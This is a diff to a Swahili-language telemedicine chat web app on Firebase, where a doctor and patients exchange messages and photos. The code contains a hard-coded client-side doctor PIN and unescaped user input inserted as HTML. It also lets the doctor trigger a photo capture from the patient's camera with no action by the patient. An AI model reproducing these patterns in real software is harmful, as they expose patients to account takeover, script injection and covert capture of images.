@@ -10,263 +10,633 @@
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
     <style>
-        :root { --gold: #D4AF37; --bg: #000; --green: #2ecc71; --red: #e74c3c; --panel: #111; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+        :root { --gold: #D4AF37; --bg: #000; --green: #2ecc71; --red: #e74c3c; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body, html { background: var(--bg); color: white; height: 100%; width: 100%; overflow: hidden; position: fixed; }
         
-        body, html { 
-            background: var(--bg); 
-            color: white; 
-            height: 100%; 
-            width: 100%; 
-            overflow: hidden; 
-            position: fixed; /* Inazuia bounce effect kwenye iOS */
-        }
-
+        /* Background */
         body::before {
-            content: ''; position: fixed; inset: 0;
+            content: '';
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
             background-image: url('https://img.freepik.com/free-photo/doctor-with-his-arms-crossed-white-background_1368-5790.jpg');
-            background-size: cover; background-position: center; opacity: 0.12; z-index: -1;
+            background-size: cover; background-position: center; opacity: 0.15; z-index: -1;
         }
 
-        #main-interface { display: none; flex-direction: column; height: 100%; height: -webkit-fill-available; }
+        /* Install button */
+        #install-container { display: none; justify-content: center; padding: 10px; background: #111; border-bottom: 2px solid var(--gold); }
+        #install-btn { background: var(--gold); border: none; padding: 12px 25px; border-radius: 30px; font-weight: bold; display: flex; align-items: center; gap: 10px; cursor: pointer; }
+
+        #main-interface { display: none; flex-direction: column; height: 100%; }
 
         .chat-header { 
-            padding: 15px; background: var(--panel); border-bottom: 1px solid var(--gold); 
+            padding: 15px; background: #111; border-bottom: 2px solid var(--gold); 
             display: flex; justify-content: space-between; align-items: center; z-index: 2000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
         }
+        .online-indicator { display: flex; align-items: center; gap: 5px; font-size: 0.8rem; }
+        .green-dot { width: 10px; height: 10px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
-        #chat-interface { flex: 1; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+        #chat-interface { flex: 1; display: flex; flex-direction: column; position: relative; height: 100%; }
 
-        /* UBORESHAJI WA MESEJI */
         .chat-messages { 
-            flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 12px;
-            scroll-behavior: smooth; -webkit-overflow-scrolling: touch;
-            padding-bottom: 20px;
+            flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px;
+            padding-bottom: 150px;
         }
-        .message { padding: 12px 16px; border-radius: 18px; max-width: 85%; font-size: 14px; line-height: 1.4; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .msg-me { background: var(--gold); color: black; align-self: flex-end; border-bottom-right-radius: 4px; }
-        .msg-other { background: #222; color: white; align-self: flex-start; border-bottom-left-radius: 4px; border: 1px solid #333; }
-        .msg-time { font-size: 10px; opacity: 0.6; margin-top: 4px; display: block; }
+        .message { padding: 12px; border-radius: 12px; max-width: 80%; font-size: 0.9rem; }
+        .msg-me { background: var(--gold); color: black; align-self: flex-end; }
+        .msg-other { background: #222; color: white; align-self: flex-start; }
+        .msg-time { font-size: 0.65rem; color: #aaa; margin-top: 3px; text-align: right; }
+        .message img { max-width: 100%; border-radius: 8px; margin-top: 5px; cursor: pointer; }
 
-        /* TYPING AREA - FIX YA KEYBOARD */
-        .bottom-container {
-            background: var(--panel);
-            border-top: 1px solid #333;
-            padding-bottom: env(safe-area-inset-bottom);
-            z-index: 3000;
-        }
-
-        .action-buttons {
-            display: flex; justify-content: space-around; padding: 8px 0; border-bottom: 1px solid #222;
-        }
-        .action-btn {
-            background: none; border: none; color: #888; display: flex; align-items: center; gap: 6px; font-size: 12px;
-        }
-
+        /* Typing area */
         .typing-area {
-            display: flex; gap: 10px; align-items: center; padding: 12px 15px;
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            background: #111;
+            padding: 15px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            border-top: 1px solid var(--gold);
+            z-index: 3000;
+            transition: bottom 0.2s ease-out;
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.5);
         }
         .input-wrapper {
-            flex: 1; background: #1a1a1a; border-radius: 25px; padding: 2px 15px; border: 1px solid #444;
-            transition: border 0.3s;
+            flex: 1;
+            background: #222;
+            border-radius: 25px;
+            padding: 5px 15px;
+            border: 2px solid var(--gold);
         }
-        .input-wrapper:focus-within { border-color: var(--gold); background: #000; }
-        
         .input-wrapper input {
-            width: 100%; background: transparent; border: none; color: white; padding: 10px 0;
-            font-size: 16px; /* 16px inazuia iOS auto-zoom */
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: white;
+            padding: 12px 0;
+            font-size: 16px;
             outline: none;
+            enterkeyhint: send;
         }
-
         .btn-send {
-            background: var(--gold); border: none; width: 45px; height: 45px; border-radius: 50%;
-            color: black; cursor: pointer; display: flex; justify-content: center; align-items: center;
-            transition: transform 0.2s;
+            background: var(--gold);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            color: black;
+            font-size: 1.3rem;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.1s;
         }
-        .btn-send:active { transform: scale(0.9); }
+        .btn-send:active {
+            transform: scale(0.95);
+        }
 
-        /* LOGIN & DASHBOARD */
-        #login-screen { position: fixed; inset: 0; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 5000; }
-        .login-box { background: #111; padding: 30px; border-radius: 25px; border: 1px solid var(--gold); width: 90%; max-width: 400px; text-align: center; }
-        .login-box input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; background: #000; color: white; border: 1px solid #333; font-size: 16px; text-align: center; }
-        .login-box button { background: var(--gold); width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; margin-top: 10px; }
+        /* Action buttons (chat) */
+        .action-buttons {
+            display: flex;
+            justify-content: space-around;
+            padding: 10px;
+            background: #111;
+            border-top: 1px solid #333;
+        }
+        .action-btn {
+            background: transparent;
+            border: none;
+            color: #aaa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .action-btn i { font-size: 1.3rem; padding: 10px; border-radius: 50%; background: #222; }
+        .action-btn:hover i { background: var(--gold); color: black; }
 
+        /* LOGIN SCREEN */
+        #login-screen { 
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; justify-content: center; 
+            align-items: center; z-index: 5000; backdrop-filter: blur(5px);
+        }
+        .login-box { 
+            background: #111; padding: 30px; border-radius: 20px; border: 2px solid var(--gold); 
+            width: 90%; max-width: 400px; text-align: center; 
+        }
+        .login-box input { 
+            width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; background: #222; 
+            color: white; border: 1px solid #333; text-align: center; 
+        }
+        .login-box .small-link { font-size: 0.8rem; color: var(--gold); margin: 15px; cursor: pointer; }
+        .login-box button { 
+            background: var(--gold); width:100%; padding:16px; border-radius:12px; border:none; 
+            font-weight:bold; cursor: pointer; 
+        }
+
+        /* DOCTOR DASHBOARD */
         #doctor-dashboard { display: none; padding: 15px; overflow-y: auto; flex: 1; }
-        .patient-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-left: 4px solid var(--gold); }
+        .notification-banner {
+            background: var(--gold); color: black; padding: 12px; border-radius: 10px; margin-bottom: 15px;
+            display: none; align-items: center; gap: 10px; animation: slideDown 0.3s;
+        }
+        @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .patient-card { 
+            background: #111; padding: 15px; border-radius: 15px; margin-bottom: 12px; 
+            border-left: 5px solid var(--gold); display: flex; flex-direction: column; gap: 10px;
+        }
+        .patient-info { display: flex; justify-content: space-between; align-items: center; }
+        .patient-name { font-weight: bold; font-size: 1.1rem; }
+        .patient-phone { color: #aaa; font-size: 0.8rem; }
+        .status-badge { padding: 4px 8px; border-radius: 12px; font-size: 0.7rem; font-weight: bold; }
+        .status-online { background: rgba(46, 204, 113, 0.2); color: var(--green); border: 1px solid var(--green); }
+        .status-waiting { background: rgba(241, 196, 15, 0.2); color: #f1c40f; border: 1px solid #f1c40f; }
+        
+        .patient-actions { display: flex; gap: 10px; flex-wrap: wrap; }
+        .btn-action {
+            flex: 1 0 auto; padding: 8px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+            font-size: 0.8rem;
+        }
+        .btn-hold { background: #f39c12; color: black; }
+        .btn-remove { background: var(--red); color: white; }
+        .btn-chat { background: var(--gold); color: black; }
+        .btn-camera { background: #3498db; color: white; }
+        .btn-mic { background: #9b59b6; color: white; }
+
+        .waiting-message {
+            background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 10px;
+            text-align: center; margin: 10px; border-left: 5px solid var(--gold);
+        }
     </style>
 </head>
 <body>
 
     <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>
 
+    <!-- Install Button -->
+    <div id="install-container">
+        <button id="install-btn"><i class="fas fa-download"></i> Sakinisha App</button>
+    </div>
+
+    <!-- LOGIN SCREEN -->
     <div id="login-screen">
         <div class="login-box">
-            <h2 style="color:var(--gold); margin-bottom: 20px;">🏥 DR. WILLIAM</h2>
+            <h2 style="color:var(--gold)">🏥 DR. WILLIAM</h2>
             <input type="text" id="name-input" placeholder="Jina lako">
-            <input type="tel" id="phone-input" placeholder="Namba ya simu" maxlength="10">
+            <input type="tel" id="phone-input" placeholder="Namba ya simu (0xxxxxxxxx)" maxlength="10">
             <input type="password" id="doctor-code" placeholder="PIN ya Daktari" style="display: none;">
-            <p style="font-size: 12px; color: var(--gold); margin: 15px; cursor: pointer;" onclick="document.getElementById('doctor-code').style.display='block'">Mimi ni Daktari</p>
-            <button onclick="startApp()">INGIA CLINIC</button>
+            <div class="small-link" onclick="document.getElementById('doctor-code').style.display='block'">Ingia kama Daktari</div>
+            <button onclick="startApp()">INGIA</button>
         </div>
     </div>
 
+    <!-- MAIN INTERFACE -->
     <div id="main-interface">
         <div class="chat-header">
             <div>
                 <span id="chat-title" style="color:var(--gold); font-weight:bold;">Dr. William</span>
-                <div id="online-indicator" style="font-size: 10px; display: flex; align-items: center; gap: 5px; color: #888;">
-                    <span style="width: 8px; height: 8px; background: var(--green); border-radius: 50%;"></span> Online
+                <div class="online-indicator" id="online-indicator">
+                    <span class="green-dot"></span>
+                    <span>Online</span>
                 </div>
             </div>
-            <button id="back-btn" onclick="goBack()" style="display:none; background:none; color:white; border:1px solid #444; padding:6px 15px; border-radius:20px; font-size: 12px;">Funga Chat</button>
+            <button id="back-btn" onclick="goBack()" style="display:none; background:none; color:white; border:1px solid var(--gold); padding:5px 12px; border-radius:15px;">Rudi</button>
         </div>
 
+        <!-- DOCTOR DASHBOARD -->
         <div id="doctor-dashboard">
-            <h4 style="margin-bottom:15px; color:#555; font-size: 12px; letter-spacing: 1px;">WAGONJWA WAKO:</h4>
+            <div id="notification-area" class="notification-banner"></div>
+            <h4 style="margin-bottom:15px; color:#888;">WAGONJWA WOTE:</h4>
             <div id="patient-list"></div>
         </div>
 
+        <!-- CHAT INTERFACE -->
         <div id="chat-interface" style="display:none;">
             <div class="chat-messages" id="chat-flow"></div>
             
-            <div class="bottom-container" id="bottom-bar">
-                <div class="action-buttons">
-                    <button class="action-btn" onclick="openWhatsApp()"><i class="fab fa-whatsapp"></i> Tuma Picha</button>
-                    <a href="tel:+255762286282" class="action-btn" style="text-decoration: none;"><i class="fas fa-phone-alt"></i> Piga Simu</a>
-                </div>
+            <div id="waiting-notice" class="waiting-message" style="display:none;">
+                ⏳ Daktari atajibu hivi karibuni... Tafadhali subiri.
+            </div>
 
-                <div class="typing-area">
-                    <div class="input-wrapper">
-                        <input type="text" id="msg-input" placeholder="Andika ujumbe..." autocomplete="off">
-                    </div>
-                    <button class="btn-send" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
+            <div class="action-buttons">
+                <button class="action-btn" onclick="openWhatsApp()"><i class="fab fa-whatsapp"></i> <span>Picha</span></button>
+                <a href="tel:+255762286282" class="action-btn"><i class="fas fa-phone-alt"></i> <span>Simu</span></a>
+            </div>
+
+            <div class="typing-area" id="typing-box">
+                <div class="input-wrapper">
+                    <input type="text" id="msg-input" placeholder="Andika ujumbe..." enterkeyhint="send">
                 </div>
+                <button class="btn-send" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
             </div>
         </div>
     </div>
 
     <script>
-        // FIREBASE CONFIG
+        // 🔥 FIREBASE CONFIG - WEKA YAKO HAPA
         const firebaseConfig = {
-            databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app"
+            apiKey: "AIzaSyB...",
+            authDomain: "drwilliamtz.firebaseapp.com",
+            databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "drwilliamtz",
+            storageBucket: "drwilliamtz.appspot.com",
+            messagingSenderId: "1234567890",
+            appId: "1:1234567890:web:abc123..."
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const storage = firebase.storage();
 
-        let myName = "", myPhone = "", isDoctor = false, activeRoomId = "";
+        // ==================== GLOBAL VARIABLES ====================
+        let myName = "";
+        let myPhone = "";
+        let isDoctor = false;
+        let activeRoomId = "";
+        let myPatientRef = null;
+        let currentMessagesListener = null;
 
-        // UI FIX FOR KEYBOARD
-        if (window.visualViewport) {
-            window.visualViewport.addEventListener('resize', () => {
-                const bottomBar = document.getElementById('bottom-bar');
-                if (window.visualViewport.height < window.innerHeight - 100) {
-                    // Keyboard ipo wazi
-                    document.body.classList.add('keyboard-open');
-                } else {
-                    // Keyboard imefungwa
-                    document.body.classList.remove('keyboard-open');
-                }
-            });
-        }
+        // DOM elements
+        const loginScreen = document.getElementById('login-screen');
+        const mainInterface = document.getElementById('main-interface');
+        const doctorDashboard = document.getElementById('doctor-dashboard');
+        const chatInterface = document.getElementById('chat-interface');
+        const patientListDiv = document.getElementById('patient-list');
+        const chatFlow = document.getElementById('chat-flow');
+        const msgInput = document.getElementById('msg-input');
+        const backBtn = document.getElementById('back-btn');
+        const chatTitle = document.getElementById('chat-title');
+        const waitingNotice = document.getElementById('waiting-notice');
+        const notificationArea = document.getElementById('notification-area');
+        const onlineIndicator = document.getElementById('online-indicator');
+        const typingArea = document.getElementById('typing-box');
 
-        function startApp() {
+        // ==================== PWA INSTALL ====================
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('install-container').style.display = 'flex';
+        });
+
+        document.getElementById('install-btn').addEventListener('click', async () => {
+            if (!deferredPrompt) return;
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            console.log(outcome);
+            deferredPrompt = null;
+            document.getElementById('install-container').style.display = 'none';
+        });
+
+        // ==================== LOGIN ====================
+        // Load saved data
+        const savedName = localStorage.getItem('drwilliam_name');
+        const savedPhone = localStorage.getItem('drwilliam_phone');
+        if (savedName) document.getElementById('name-input').value = savedName;
+        if (savedPhone) document.getElementById('phone-input').value = savedPhone;
+
+        window.startApp = function() {
             myName = document.getElementById('name-input').value.trim();
             myPhone = document.getElementById('phone-input').value.trim();
             const code = document.getElementById('doctor-code').value.trim();
 
-            if (!myName) return alert("Weka jina");
-
-            if (code === "W005") {
-                isDoctor = true;
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-interface').style.display = 'flex';
-                showDoctorDashboard();
-            } else {
-                if (myPhone.length < 10) return alert("Namba haijatimia");
-                activeRoomId = myPhone;
-                db.ref('patients/' + myPhone).set({ name: myName, phone: myPhone, online: true, lastSeen: Date.now() });
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-interface').style.display = 'flex';
-                openChat(myPhone, "Dr. William");
-            }
-        }
-
-        function showDoctorDashboard() {
-            document.getElementById('doctor-dashboard').style.display = 'block';
-            document.getElementById('chat-interface').style.display = 'none';
-            document.getElementById('chat-title').innerText = "Doctor Terminal";
+            if (!myName) return alert("Weka jina lako");
             
-            db.ref('patients').on('value', snap => {
-                const list = document.getElementById('patient-list');
-                list.innerHTML = "";
-                snap.forEach(child => {
-                    const p = child.val();
-                    list.innerHTML += `
-                        <div class="patient-card" onclick="openChat('${child.key}', '${p.name}')">
-                            <div style="font-weight:bold">${p.name}</div>
-                            <div style="font-size:12px; color:#888">${p.phone}</div>
-                        </div>`;
+            if (code !== "W005") { // Mgonjwa
+                if (!myPhone) return alert("Weka namba ya simu");
+                if (!/^0[0-9]{9}$/.test(myPhone)) {
+                    return alert("Namba lazima iwe na tarakimu 10 na kuanza na 0");
+                }
+
+                // Check if blocked
+                db.ref('blocked/' + myPhone).once('value', (snap) => {
+                    if (snap.exists()) {
+                        alert("Samahani, akaunti yako imezuiliwa");
+                        return;
+                    }
+                    
+                    // Save to localStorage
+                    localStorage.setItem('drwilliam_name', myName);
+                    localStorage.setItem('drwilliam_phone', myPhone);
+
+                    isDoctor = false;
+                    activeRoomId = myPhone;
+                    
+                    myPatientRef = db.ref('patients/' + myPhone);
+                    myPatientRef.set({
+                        name: myName,
+                        phone: myPhone,
+                        online: true,
+                        status: 'waiting',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                    myPatientRef.onDisconnect().update({ online: false });
+
+                    loginScreen.style.display = 'none';
+                    mainInterface.style.display = 'flex';
+                    openPatientChat(myPhone);
+
+                    // ------------------- LISTEN FOR REQUESTS FROM DOCTOR -------------------
+                    // Kamera request
+                    db.ref('requests/camera/' + myPhone).on('value', async (snap) => {
+                        if (snap.val() === true) {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                // Capture a photo
+                                const video = document.createElement('video');
+                                video.srcObject = stream;
+                                video.play();
+                                // Wait a bit for camera to initialize
+                                setTimeout(() => {
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    canvas.toBlob(async (blob) => {
+                                        // Upload to storage
+                                        const storageRef = storage.ref(`photos/${myPhone}/${Date.now()}.jpg`);
+                                        await storageRef.put(blob);
+                                        const url = await storageRef.getDownloadURL();
+                                        // Send as message
+                                        db.ref('messages/' + myPhone).push({
+                                            sender: myName,
+                                            text: '',
+                                            imageUrl: url,
+                                            timestamp: firebase.database.ServerValue.TIMESTAMP
+                                        });
+                                        // Stop stream
+                                        stream.getTracks().forEach(t => t.stop());
+                                        // Reset request
+                                        db.ref('requests/camera/' + myPhone).remove();
+                                    }, 'image/jpeg');
+                                }, 500);
+                            } catch (err) {
+                                console.error('Camera error', err);
+                                // Send error message
+                                db.ref('messages/' + myPhone).push({
+                                    sender: "System",
+                                    text: "❌ Imeshindwa kufungua kamera. Hakikisha umeiruhusu.",
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                });
+                                db.ref('requests/camera/' + myPhone).remove();
+                            }
+                        }
+                    });
+
+                    // Mic request (kwa sasa tunatuma ujumbe tu, unaweza kupanua)
+                    db.ref('requests/mic/' + myPhone).on('value', (snap) => {
+                        if (snap.val() === true) {
+                            db.ref('messages/' + myPhone).push({
+                                sender: "System",
+                                text: "🎤 Daktari anaomba kuwasha maikrofoni yako. (Huduma ya sauti inatengenezwa)",
+                                timestamp: firebase.database.ServerValue.TIMESTAMP
+                            });
+                            db.ref('requests/mic/' + myPhone).remove();
+                        }
+                    });
                 });
+            } else { // Daktari
+                isDoctor = true;
+                localStorage.setItem('drwilliam_name', myName);
+                loginScreen.style.display = 'none';
+                mainInterface.style.display = 'flex';
+                showDoctorDashboard();
+            }
+        };
+
+        // ==================== DOCTOR DASHBOARD ====================
+        function showDoctorDashboard() {
+            doctorDashboard.style.display = 'block';
+            chatInterface.style.display = 'none';
+            backBtn.style.display = 'none';
+            chatTitle.innerText = "Dr. William (Daktari)";
+            onlineIndicator.style.display = 'flex';
+
+            db.ref('doctor_online').set(true);
+            db.ref('doctor_online').onDisconnect().set(false);
+
+            // Listen for patients
+            db.ref('patients').on('value', (snap) => {
+                let html = '';
+                snap.forEach((child) => {
+                    const p = child.val();
+                    const phone = child.key;
+                    const isOnline = p.online ? true : false;
+                    const statusClass = isOnline ? 'status-online' : 'status-waiting';
+                    const statusText = isOnline ? '● Online' : '⏳ Kusubiri';
+
+                    html += `
+                        <div class="patient-card" data-phone="${phone}">
+                            <div class="patient-info">
+                                <div>
+                                    <div class="patient-name">${p.name}</div>
+                                    <div class="patient-phone">${p.phone}</div>
+                                </div>
+                                <div class="status-badge ${statusClass}">${statusText}</div>
+                            </div>
+                            <div class="patient-actions">
+                                <button class="btn-action btn-hold" onclick="holdPatient('${phone}')"><i class="fas fa-pause"></i> Subirisha</button>
+                                <button class="btn-action btn-remove" onclick="removePatient('${phone}')"><i class="fas fa-ban"></i> Ondoa</button>
+                                <button class="btn-action btn-camera" onclick="requestCamera('${phone}')"><i class="fas fa-camera"></i> Kamera</button>
+                                <button class="btn-action btn-mic" onclick="requestMic('${phone}')"><i class="fas fa-microphone"></i> Sauti</button>
+                                <button class="btn-action btn-chat" onclick="openDoctorChat('${phone}', '${p.name}')"><i class="fas fa-comment"></i> Gumzo</button>
+                            </div>
+                        </div>
+                    `;
+                });
+                patientListDiv.innerHTML = html || '<div style="color:#888; text-align:center;">Hakuna wagonjwa</div>';
+            });
+
+            // New patient notification
+            db.ref('patients').limitToLast(1).on('child_added', (snap) => {
+                if (snap.key !== activeRoomId) {
+                    notificationArea.style.display = 'flex';
+                    notificationArea.innerHTML = `<i class="fas fa-bell"></i> 🆕 Mgonjwa mpya: ${snap.val().name}`;
+                    setTimeout(() => notificationArea.style.display = 'none', 5000);
+                }
             });
         }
 
-        function openChat(id, title) {
-            activeRoomId = id;
-            document.getElementById('doctor-dashboard').style.display = 'none';
-            document.getElementById('chat-interface').style.display = 'flex';
-            document.getElementById('chat-title').innerText = title;
-            if(isDoctor) document.getElementById('back-btn').style.display = 'block';
+        window.holdPatient = function(phone) {
+            db.ref('patients/' + phone).update({ status: 'waiting' });
+            db.ref('waiting/' + phone).set({
+                message: "Daktari atajibu hivi karibuni...",
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        };
 
-            db.ref('messages/' + id).off();
-            db.ref('messages/' + id).on('child_added', snap => {
+        window.removePatient = function(phone) {
+            if (!confirm('Una uhakika unamtoa kabisa?')) return;
+            db.ref('blocked/' + phone).set({ phone: phone, timestamp: Date.now() });
+            db.ref('patients/' + phone).remove();
+            db.ref('messages/' + phone).remove();
+            // Also remove any requests
+            db.ref('requests/camera/' + phone).remove();
+            db.ref('requests/mic/' + phone).remove();
+        };
+
+        window.requestCamera = function(phone) {
+            db.ref('requests/camera/' + phone).set(true);
+            // Show a quick notification
+            notificationArea.style.display = 'flex';
+            notificationArea.innerHTML = `<i class="fas fa-camera"></i> Ombi la kamera limetumwa kwa mgonjwa.`;
+            setTimeout(() => notificationArea.style.display = 'none', 3000);
+        };
+
+        window.requestMic = function(phone) {
+            db.ref('requests/mic/' + phone).set(true);
+            notificationArea.style.display = 'flex';
+            notificationArea.innerHTML = `<i class="fas fa-microphone"></i> Ombi la sauti limetumwa.`;
+            setTimeout(() => notificationArea.style.display = 'none', 3000);
+        };
+
+        window.openDoctorChat = function(phone, patientName) {
+            activeRoomId = phone;
+            doctorDashboard.style.display = 'none';
+            chatInterface.style.display = 'flex';
+            backBtn.style.display = 'block';
+            chatTitle.innerText = patientName;
+            
+            db.ref('waiting/' + phone).remove();
+            listenForMessages(phone);
+        };
+
+        // ==================== PATIENT CHAT ====================
+        function openPatientChat(phone) {
+            doctorDashboard.style.display = 'none';
+            chatInterface.style.display = 'flex';
+            backBtn.style.display = 'none';
+            chatTitle.innerText = "Dr. William";
+            onlineIndicator.style.display = 'flex';
+
+            db.ref('doctor_online').on('value', (snap) => {
+                if (snap.val()) {
+                    onlineIndicator.innerHTML = '<span class="green-dot"></span><span>Online</span>';
+                } else {
+                    onlineIndicator.innerHTML = '<span class="green-dot" style="background:#aaa;"></span><span>Offline</span>';
+                }
+            });
+
+            db.ref('waiting/' + phone).on('value', (snap) => {
+                waitingNotice.style.display = snap.exists() ? 'block' : 'none';
+            });
+
+            listenForMessages(phone);
+        }
+
+        // ==================== MESSAGING ====================
+        function listenForMessages(roomId) {
+            // Remove previous listener
+            if (currentMessagesListener) {
+                db.ref('messages/' + activeRoomId).off('child_added', currentMessagesListener);
+            }
+
+            activeRoomId = roomId;
+            chatFlow.innerHTML = ''; // Clear chat
+
+            const messagesRef = db.ref('messages/' + roomId);
+            currentMessagesListener = messagesRef.orderByChild('timestamp').on('child_added', (snap) => {
                 const msg = snap.val();
-                appendMsg(msg);
+                const isMe = (isDoctor && msg.sender === "Dr. William") || (!isDoctor && msg.sender === myName);
+                const div = document.createElement('div');
+                div.className = `message ${isMe ? 'msg-me' : 'msg-other'}`;
+                const time = msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString() : '';
+                let content = `<b>${msg.sender}</b><br>`;
+                if (msg.imageUrl) {
+                    content += `<img src="${msg.imageUrl}" onclick="window.open(this.src)">`;
+                } else {
+                    content += msg.text;
+                }
+                content += `<div class="msg-time">${time}</div>`;
+                div.innerHTML = content;
+                chatFlow.appendChild(div);
+                chatFlow.scrollTop = chatFlow.scrollHeight;
+                if (!isMe) document.getElementById('notifSound').play();
             });
         }
 
-        function appendMsg(msg) {
-            const flow = document.getElementById('chat-flow');
-            const isMe = (isDoctor && msg.sender === "Dr. William") || (!isDoctor && msg.sender === myName);
-            const div = document.createElement('div');
-            div.className = `message ${isMe ? 'msg-me' : 'msg-other'}`;
-            div.innerHTML = `<div>${msg.text}</div><span class="msg-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>`;
-            flow.appendChild(div);
-            flow.scrollTop = flow.scrollHeight;
-            if(!isMe) document.getElementById('notifSound').play();
-        }
-
-        function sendMsg() {
-            const input = document.getElementById('msg-input');
-            const text = input.value.trim();
-            if(!text) return;
-
+        window.sendMsg = function() {
+            const text = msgInput.value.trim();
+            if (!text || !activeRoomId) return;
+            
             db.ref('messages/' + activeRoomId).push({
                 sender: isDoctor ? "Dr. William" : myName,
                 text: text,
-                timestamp: Date.now()
+                timestamp: firebase.database.ServerValue.TIMESTAMP
             });
-            input.value = "";
-            input.focus();
-        }
+            
+            msgInput.value = "";
+            msgInput.focus();
+        };
 
-        document.getElementById('msg-input').addEventListener('keypress', e => {
-            if(e.key === 'Enter') sendMsg();
+        // ==================== ENTER KEY ====================
+        msgInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                sendMsg();
+            }
         });
 
-        function goBack() {
-            if(isDoctor) showDoctorDashboard();
-            else location.reload();
+        // ==================== KUSHUGHULIKIA KIBODI (SMOOTH) ====================
+        function adjustForKeyboard() {
+            if (window.visualViewport) {
+                const keyboardHeight = window.innerHeight - window.visualViewport.height;
+                typingArea.style.bottom = Math.max(20, keyboardHeight) + 'px';
+                
+                if (chatFlow.children.length > 0) {
+                    setTimeout(() => {
+                        chatFlow.scrollTop = chatFlow.scrollHeight;
+                    }, 50);
+                }
+            }
         }
 
-        function openWhatsApp() {
-            let msg = `Habari, naitwa ${myName}. Nahitaji msaada wa picha.`;
-            window.open(`https://wa.me/255762286282?text=${encodeURIComponent(msg)}`, '_blank');
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', adjustForKeyboard);
+        } else {
+            window.addEventListener('resize', adjustForKeyboard);
         }
+
+        msgInput.addEventListener('focus', () => {
+            setTimeout(adjustForKeyboard, 100);
+        });
+
+        msgInput.addEventListener('blur', () => {
+            typingArea.style.bottom = '20px';
+        });
+
+        // ==================== UI FUNCTIONS ====================
+        window.goBack = function() {
+            if (isDoctor) {
+                doctorDashboard.style.display = 'block';
+                chatInterface.style.display = 'none';
+                backBtn.style.display = 'none';
+                chatTitle.innerText = "Dr. William (Daktari)";
+                if (currentMessagesListener) {
+                    db.ref('messages/' + activeRoomId).off('child_added', currentMessagesListener);
+                }
+            } else {
+                location.reload();
+            }
+        };
+
+        window.openWhatsApp = function() {
+            let msg = isDoctor 
+                ? "Habari, naitwa Dr. William. Nataka kutuma picha."
+                : `Habari Dr. William, naitwa ${myName} (${myPhone}). Nataka kutuma picha.`;
+            window.open(`https://wa.me/255762286282?text=${encodeURIComponent(msg)}`, '_blank');
+        };
     </script>
 </body>
 </html>
